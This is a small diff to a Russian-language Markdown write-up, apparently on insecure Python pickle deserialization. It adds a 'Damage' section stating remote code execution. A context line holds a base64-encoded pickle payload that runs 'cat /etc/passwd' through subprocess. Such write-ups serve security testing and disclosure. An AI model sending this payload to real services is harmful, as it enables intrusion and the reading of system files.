@@ -58,3 +58,7 @@ Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCigoUydjYXQnCnAyClMnL2V0Yy9wYXNzd2QnCnAzCnRw
 Результат
 
 ![](img/pickle_1.png)
+
+# Ущерб
+
+Получение RCE
